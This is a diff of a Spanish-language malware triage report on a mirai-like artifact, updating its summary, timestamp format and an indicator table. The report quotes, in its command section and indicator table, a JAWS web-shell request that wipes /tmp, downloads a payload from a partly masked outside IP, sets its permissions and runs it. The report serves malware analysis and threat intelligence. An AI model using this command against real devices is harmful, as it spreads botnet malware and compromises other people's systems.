@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atr
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T21:04:53+00:00`
+- **Registrado:** `2026-08-09T21:04:53.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -55,8 +56,8 @@ GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.XXX/jaws;chmod+777+jaws;sh+jaws;./
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
 | ip | 140.233.190.XXX | static_analysis |
-| hash | ce6127239bcb7d38dfbbcb2604dcb8c89b1b1900da92d745670f0a6d971169bd | static_analysis |
 | command | GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.XXX/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1 | strings |
+| hash | ce6127239bcb7d38dfbbcb2604dcb8c89b1b1900da92d745670f0a6d971169bd | static_analysis |
 | ip | 45.71.14.XXX | artifact_source |
 
 ## 🔎 Triage
